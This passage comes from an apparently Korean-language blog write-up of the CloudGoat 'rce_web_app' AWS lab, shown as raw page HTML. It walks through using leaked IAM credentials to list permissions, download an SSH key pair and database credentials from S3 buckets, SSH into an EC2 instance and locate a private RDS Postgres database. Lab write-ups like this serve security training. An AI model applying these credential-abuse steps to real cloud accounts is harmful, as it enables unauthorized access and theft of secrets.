url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQoz1WSWW/TUBCFTVkChbZZHGdzvMd7YsdOnDi7s1DUFHjgrS8gIfET+PsHzUSOxMPo2tf3fnPOGQvnrz+QL/dYrA4oikfkp+/wv/3EYlFgf3zCYrnHenvCdveM0znD779DvLwE+DU44I/8GYkYoqsHMMwIt5/aEMJRjr4aQFZ8dHo2GpKBVs9Fp+dc9mQHUttCr++h1TUhazYUzYUie9CVEKoa8lnDivHxrgthku3hhTN4QYae4qPZsiArHtpdB13ZRbWuMrjRNCBKJlQ9Qqtjo9pQIbZNNJo6RMlAXdRx86YGYVOcYbsTpNMdl+NNkWYFwtECcbLhRrP8CC+YYRQvsVx/wTBeMoiUU0OC31dlvHpdhZDNjwyMxms43gSaMUIwzHmPIPSeTHeIkzUXnaOY6LnZMlH5IOHd+yYXA+N0wxmo+pBzoq4KP/swB2O2R5YJTFmXeVM91PocBakk25VbCcJ6+wTditga2SWw62cMs5yEcyTFpLY844dzKFqIuqjhbUVkZZQfK6ShWHZysRItoJkRXyDLdJmUUJbkhHIdRkteZTXAfbV/hZUlTOcHHjkdjMYr6AQclsAJx0ENaBC2N+FvpL783QTh7qqOgdvimS3SZKkGTopxumEIKaHsqClNmqaczQ+85qtHBpfAq8J0WrBCukzdKUPHn3IMBG93bc6QInGD7BKLMeL9WkOFcPPwH/AfYv0/FL+hxBMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/8700800edea00dbbde58e6cd0368b843/37523/2.png\"\n        srcset=\"/static/8700800edea00dbbde58e6cd0368b843/e9ff0/2.png 180w,\n/static/8700800edea00dbbde58e6cd0368b843/f21e7/2.png 360w,\n/static/8700800edea00dbbde58e6cd0368b843/37523/2.png 720w,\n/static/8700800edea00dbbde58e6cd0368b843/59000/2.png 917w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>유출된 McDuck 의 AWS Credential을 통해서 사용할 수 있는 서비스를 나열하였습니다. 관련 권한들을 보면 <code class=\"language-text\">EC2, RDS, S3</code> 권한이 있는 것을 확인할 수 있어 뭔가 공격할 수 있는 벡터가 많아 보입니다.</li>\n</ul>\n<h3 id=\"s3-bucket-리스트-분석및-하드-코딩된-ssh-key-수집\" style=\"position:relative;\"><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%95%98%EB%93%9C-%EC%BD%94%EB%94%A9%EB%90%9C-ssh-key-%EC%88%98%EC%A7%91\" aria-label=\"s3 bucket 리스트 분석및 하드 코딩된 ssh key 수집 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 Bucket 리스트 분석및 하드 코딩된 SSH key 수집</h3>\n<ul>\n<li>AWS 계정에서 S3 버킷을 나열해 보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABN0lEQVQY0y2PbU+CUABGr+myLOsqFrmQEkWQJAQV9QYCvizdWmv1/3/LabE+nD0fni/niO3+gyw/sogz0uxImh7wdt9MFjlKbZmGCmccYY+mJY4bMrRDHF/Hja/xbZ2iETCpW1QvNITnrxiMIob/+MEbhuGid20M06P76KDdWdy2TW5bJu1On5b2ROVMQwiJqEhE9RpRbVKpSsTh/ZO8OFFsT2TFEbXO6CxPtM0xVt/loWvxbHkMbL/EcQMGwymh0tl8NghVh5umgWz1qF/eI6J5hh8ovMmS1zDBdiJsL2Y8WeF6C5zxvPxf/BXhbMNfkWyb1OqS+pXk/FJyVmtRO9fKFfn2xCLeMI9TVqooDXvFD15csIwT/CBmuc5RyY4k3fOW7hg5M2aJTv7VIEo6NG8MKjVZJv8Cox6SN9bYywIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/a4b29e1a06f00e939368d6b5e3eed175/37523/3.png\"\n        srcset=\"/static/a4b29e1a06f00e939368d6b5e3eed175/e9ff0/3.png 180w,\n/static/a4b29e1a06f00e939368d6b5e3eed175/f21e7/3.png 360w,\n/static/a4b29e1a06f00e939368d6b5e3eed175/37523/3.png 720w,\n/static/a4b29e1a06f00e939368d6b5e3eed175/d9217/3.png 904w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 게정에서는 3개의 Cloud Goat와 관련된 버킷이 있는 것을 확인할 수 있습니다. 해당 S3 버킷을 다운로드 해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws s3 sync s3<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cg<span class=\"token operator\">-</span>keystore<span class=\"token operator\">-</span>s3<span class=\"token operator\">-</span>bucket<span class=\"token operator\">-</span>rce<span class=\"token operator\">-</span>web<span class=\"token operator\">-</span>app<span class=\"token operator\">-</span>cgid7ge6zuhcu1 <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>key <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile mcduck</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLklEQVQY0zWQyU7CABRFiySGAAUVQQhBESid54EylEksU5CNCzf8/2cc00YXJ/fl5SXv5ArLVUoYJSSrFNeOGNgzKv6esWQgKw79gYqm+2i6h2EG2M4ETY9Ijs/sf8oEyyZircdj441ytYNgWFNkLUTVJ4xkj7ESMBy7eb4PbYaSk8+qHmE583x3X2oiCDUKxYw6heIDwt1f7g9XMstdemH3cWR5+kY639isU1abA4tkR3bzz2Z7xLJnbL9eudxa+EkbUewh1ruUyi2E7HN/YJGZ6uY0NzHMODfOcLwllrsgiDZoRoyiRfjhGs2YIskTRpKPrIZ0ujIVsYPgB3NUzcVxY1w7ZOQlVCcnVMVCUV1GkoFpR3l3GY4XY5ox2+sL51uZ2WebRmPIU7Ofd/gLpxSYD9lDkRYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/8f9af5ffcf50839cbc95626993287e3d/37523/4.png\"\n        srcset=\"/static/8f9af5ffcf50839cbc95626993287e3d/e9ff0/4.png 180w,\n/static/8f9af5ffcf50839cbc95626993287e3d/f21e7/4.png 360w,\n/static/8f9af5ffcf50839cbc95626993287e3d/37523/4.png 720w,\n/static/8f9af5ffcf50839cbc95626993287e3d/636c2/4.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"ssh-접속전-준비-과정\" style=\"position:relative;\"><a href=\"#ssh-%EC%A0%91%EC%86%8D%EC%A0%84-%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95\" aria-label=\"ssh 접속전 준비 과정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH 접속전 준비 과정</h3>\n<ul>\n<li><code class=\"language-text\">keystore</code>에서 파일을 다운로드하였는데 이는 SSH key-pair 처럼 보입니다. SSH key-pari, EC2 인스턴스를 나열할 수 있는 기능이 있기 때문에 SSH로 접근이 가능한 EC2 인스턴스가 있는지 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLUlEQVQY0z2PbU+CYBiFH9/yrRGQRjnFFzANBEMUEZyY0twyP/UL+tCP6NdfDXV9uHbO7vvsbEeMLZ9NciCK9+zST9L9B25y5MnbspjHTJwAxw2YeisM08EwJ/R6Ds92l2VaZxopqM0WIi9TrWuIfFFBktvY7gpj6NFqj8+PSu2Bav2RSk07a6GkkivIZPmMzOcKyhX5/ybumwMkWUdSdJqaSbtrcye1KJcUiuUm5ZpG8aaBELdX6lckhFARQj77S6GC8BcbgjAhXqeE0Q7XmWMGe7TXhIk1Y/Tinaf2+had7oj+wKKj2wwtnfBQw1srqI3L5KxUWLZPsn1n5oeE0ZYoiBgkJ+T4xMJbMHF9HHdOvH4jXG3YJDvCZcr+aPH9e8PXj0rPMMgVVPJFmT+lGonSM93GJgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/b278cc8917e118df4300ac7fe2ac088a/37523/5.png\"\n        srcset=\"/static/b278cc8917e118df4300ac7fe2ac088a/e9ff0/5.png 180w,\n/static/b278cc8917e118df4300ac7fe2ac088a/f21e7/5.png 360w,\n/static/b278cc8917e118df4300ac7fe2ac088a/37523/5.png 720w,\n/static/b278cc8917e118df4300ac7fe2ac088a/84cc5/5.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"Reservations[*].Instances[*].Tags\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>output text <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile mcduck</code></pre></div>\n<ul>\n<li>AWS 게정에서 실행중인 EC2 인스턴스가 있는 것을 확인할 수있으며 SSH key-pair를 사용하여 EC2 인스턴스에 접근을 해보도록 하겠습니다.</li>\n<li>먼저 접근을 하기전에 공용 IP를 알아야 하기 때문에 자주 사용하던 쿼리로 <code class=\"language-text\">PublicIpAddress</code> 를 조회하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"Reservations[*].Instances[*].PublicIpAddress\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>output text <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile mcduck</code></pre></div>\n<ul>\n<li>다음과 같이 해당 EC2 서버의 IP 대역을 확인하고 접속할 준비를 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABI0lEQVQY06WPy1LCQBBFJwGlCpKZCY+ETEAeCa+AESogBaIlsnHj/3/O0QQWunZx696+3YvTIk4yji8X0mXO/nDmsH8jO38Rbi+kizWz+YbJNGOxzMub7GnPfLHBmCnTNOb46fD8oQhMD7vaRDgyou3HjJM1s8WO/mCF5z2gZETdNTRcg6N6ZS5updenVg8QtkKIQt5VlsKqaMQoXpFvT+S7V+ZpznTyiB5m1AYZUTjG747o+ANCExOE49JNlOAHMcNkSP7usD5J2r7BqhSEbojX7NNwurjKIGVIvTXk3hugdFR2jgxRuofUUelF33BCdKtL0Fd0Ik3d6WBXClqrwJYlsrBuLlwsy73Nv3fyb/f7ZVtjVTXCrnr8S3cau6qv+YfwG+GxlOvSW8RzAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/fdb73ae4534e73d626119120ef960c63/37523/6.png\"\n        srcset=\"/static/fdb73ae4534e73d626119120ef960c63/e9ff0/6.png 180w,\n/static/fdb73ae4534e73d626119120ef960c63/f21e7/6.png 360w,\n/static/fdb73ae4534e73d626119120ef960c63/37523/6.png 720w,\n/static/fdb73ae4534e73d626119120ef960c63/d9217/6.png 904w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 98.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAADOUlEQVQ4y3VUaZOiSBSsbo/GVlFQvA9EBBVBEB3EVmdXe2Z3Iubj/P+/khtZHhFu2B9evOKorMyX75WIN0ekuzO2uzPS9G8skxOcw2+EYQrL9jGeBHBnq0ueRph5McZ2CDdoYRqX0B83kH9roFBsoN6wIIJoD2e6RhBesuPG8BcJltEBy9UB37afCOMj1skJi2CHcHWE7awghA4hNAhRhchUkFfq6A3mEPNFAn/5gf3xF5L0Ex/Hf+Xm7e4HNskJq/V32E6E8SRCodhCNl/DW6GBbF5HJldFJqfhNaPhrWCg1XEgyEqeHB8xWySIVkeEV9Y8yLSWaHen6PZnKJY7KKldvGbJrHJh+EKGKhRKNkYQwWqPINwhio/w/ASL8AP+txMGpgetNoDRtKBWuyiW2yipBGxLhuWqDrVegV4yoGVbUAoGmu0JxM/dP9geztimJ+z3Z2xPv+H++IPD4RNJ+heieAdnGmI09mA7AWzHhznyEaYtrH8WcHZHOOcDlBQD7f4Uwve2cGYbeH4q88RdYRmkCGhKdEC0/o65n8IPPzBfbOU7yw6vhlylZ0rSlE5vCmE5EQbmQjpnWj5MK0Bv6GE0XsofhiNfBp/pYlUfoKL1kVNq0pRsTkPmakq760IQzAtSaLUhmh1Hnj5xY+nqyF5Cr5vS2ZdM9WLGiwrxWrk/M7i+A9JqnqxWe6g1LMmKjt7yjVUmp0ugG8gN6BHQuTCkTAJzXa70UNEG6A892O4KRnMsJXIKcm/1B6BHhtfGJhg3trqulM2PZEPQ9vVdudKVmSq+ArxPyuVnUzIgCGvGzVV9eGfLHhSiDCHUB5kPDJU6umybRsuWRjBoBB3llNAYMndnG9SbYymXDU32XzOcQbA+3My2ICidZRnImCy1uilNoRJmgj6v4XWWWXya0enNZBC0qHYgRFFKlG1ybRXmryQX3hvo9FwIghD0FnSVbI2mjbxiyJ//H08Bi01Y9vIimUboxgg1YyRl0RQaobw3ZVOzfgSnXK6fSeYFSzKC1xPHzp1vYI4DOTU0hoB0mVcWQ6325UG8vp4DNiUZodbaKOutS2jdOwPGbcTE62V9i2eSlfeGbJv/AKM9Bm3e833FAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/98b94b34f0f963b56594a67961b8207d/37523/7.png\"\n        srcset=\"/static/98b94b34f0f963b56594a67961b8207d/e9ff0/7.png 180w,\n/static/98b94b34f0f963b56594a67961b8207d/f21e7/7.png 360w,\n/static/98b94b34f0f963b56594a67961b8207d/37523/7.png 720w,\n/static/98b94b34f0f963b56594a67961b8207d/d30ee/7.png 980w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>와우 키를 획득하고 접속을 시도하니 접속이 성공된 것을 확인할 수 있습니다.</li>\n<li>EC2 인스턴스에는 S3 Storage와 상호 작용할 수 있는 인스턴스 프로파일이 있는 것이 기본적인 패턴 입니다.</li>\n</ul>\n<h3 id=\"접근-가능한-s3-bucket-분석\" style=\"position:relative;\"><a href=\"#%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-s3-bucket-%EB%B6%84%EC%84%9D\" aria-label=\"접근 가능한 s3 bucket 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>접근 가능한 S3 Bucket 분석</h3>\n<ul>\n<li>EC2 인스턴스가 다른 두 곳의 S3 bucket에 있는 객체 에 접근할 수 있는지 확인해 보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws s3 sync s3<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cg<span class=\"token operator\">-</span>secret<span class=\"token operator\">-</span>s3<span class=\"token operator\">-</span>bucket<span class=\"token operator\">-</span>rce<span class=\"token operator\">-</span>web<span class=\"token operator\">-</span>app<span class=\"token operator\">-</span>cgid7ge6zuhcu1 <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>secret</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeklEQVQoz5WRW2/aQBCFF0gKAWODqcH39RWM7XBNglopUv//n/qq2QgprdqHPBzN6szumTln1f74QnO4IrU73SiqM6fLO93zD9r+xvX1F/vuDZ33JLojjBuDKNmTV0eCqMFexKy8nNHjEtWeXsi3HYEuCXVNmOzxwy0LV2PZEc4ywV7luOuS5UqzcFPDz50Y93tm6ujRNRg+LFHH8ztZcSTNerL8QKJbUt3RH35Sbs8U1YlAXxhPNig1Rw1s1NBBDRyUsk0VoTtUut0R5AVxVROXO/ykp25vxGnL1Ap4snysicdYLt/F/obw9153uZI3e8KiNLY9fSGuX4mSxlgX0ZkdMrMjk5XYFU7qbB4wm4fGtuDbxEOV9dmE7G0q1n5NEO3MdsJJ4BK+nEVcYhGs/cp80CbY4ocf94WXgapp38yDrDjgevlHTp9t/BP/6cs7CV2myaY6f2blFQxHiz+C/gqU/GqQ1oytFU+2x9TxGTsZUydh9LBk8EXx32lv4PK8WUwuAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/122d1f25bdbd44783c13742c69b40f4a/37523/8.png\"\n        srcset=\"/static/122d1f25bdbd44783c13742c69b40f4a/e9ff0/8.png 180w,\n/static/122d1f25bdbd44783c13742c69b40f4a/f21e7/8.png 360w,\n/static/122d1f25bdbd44783c13742c69b40f4a/37523/8.png 720w,\n/static/122d1f25bdbd44783c13742c69b40f4a/58213/8.png 902w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>EC2 인스턴스에는 S3 Bucket에서 객체를 다운로드 할 수 있는 권한이 <code class=\"language-text\">cg-secret-s3-bucket-rce-web-app-cgid7ge6zuhcu1</code> 에 있습니다..</li>\n<li>다운로드한 파일에는 데이터베이스 Credential 이 있지만 해당 정보를 가지고 어디에서 사용할지를 모릅니다.</li>\n</ul>\n<h3 id=\"rds-instance-나열-및-postgresql-접속\" style=\"position:relative;\"><a href=\"#rds-instance-%EB%82%98%EC%97%B4-%EB%B0%8F-postgresql-%EC%A0%91%EC%86%8D\" aria-label=\"rds instance 나열 및 postgresql 접속 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDS Instance 나열 및 PostgreSQL 접속</h3>\n<ul>\n<li>IAM 사용자 McDuck은 AWS 계정의 RDS 인스턴스를 나열한 권한이 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws rds describe<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance <span class=\"token operator\">-</span><span class=\"token operator\">-</span>region us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABnklEQVQoz31T127CQBA8ejHGuNsYYzqmJ6Ik8BKF/P83TTQrQwgCHlZ767vbm7JWxbKNMJoijFIYZgzW+aKJQsmSYF2qONfMKFed7JuFXKEl55lLFRuKhVIa/HCM9+0XlusTVpsT4mSBpL9CpzuH5fTQshLY7gCW04frj+B4QzSa0bOGDbQ7KXaHb2k2ne2lGaNS82RfKT3Lt6FD5Q2oXFNCGl7ouMFIGvYGa0EXxXM0WzF0I4JhdmHaPUFHlKyJmmueYa3pbZFC6UZHNgjf8QbwgpFcrDdCmHYijeqNAOWqi2rdl+CayP/WbqavDSWQlS6Xur0lJukO/eEmQ9MXrWqaLywYcv5JSEM6Sf50+vD5g/3HGbvDGel8j8H47aolHyA9av4o7kzRxWU2XKyPWK6PCNoTocEH5Uwm/K2rDxteNlTOkMtRPBPHaQz1pLbMF30pPum9RMiipgVymbSYNT0UzW6RXNA+Qvmfct4QV0l7PN0iXRwEIWnz7+Egc7DpOB+6p/uQMjMRcFRcfwi/PYEXjAUtx4pUOSrU9ZWGv4nOH71U8ySPAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/264f0935ad801f8ffdc18347f282b0e9/37523/9.png\"\n        srcset=\"/static/264f0935ad801f8ffdc18347f282b0e9/e9ff0/9.png 180w,\n/static/264f0935ad801f8ffdc18347f282b0e9/f21e7/9.png 360w,\n/static/264f0935ad801f8ffdc18347f282b0e9/37523/9.png 720w,\n/static/264f0935ad801f8ffdc18347f282b0e9/dc616/9.png 933w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 계정에 <code class=\"language-text\">Postgress</code> 을 사용하는 RDS 인스턴스가 있지만 Public으로 접근이 불가능 합니다.</li>\n<li>인스턴스 설명에서 EC2 인스턴스와 RDS 인스턴스가 동일한 VPC에 있었기 때문에  EC2가 터미널을 사용하여 연결할 수있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token string\">\"DBInstances\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"DBInstanceIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-rce-web-app-cgid7ge6zuhcu1\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBInstanceClass\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db.t2.micro\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Engine\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgres\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBInstanceStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"available\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MasterUsername\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cgadmin\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cloudgoat\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Endpoint\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Address\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-rce-web-app-cgid7ge6zuhcu1.cklw91kahwum.us-east-1.rds.amazonaws.com\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Port\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5432</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"HostedZoneId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Z2R2ITUGPM61AM\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AllocatedStorage\"</span><span class=\"token 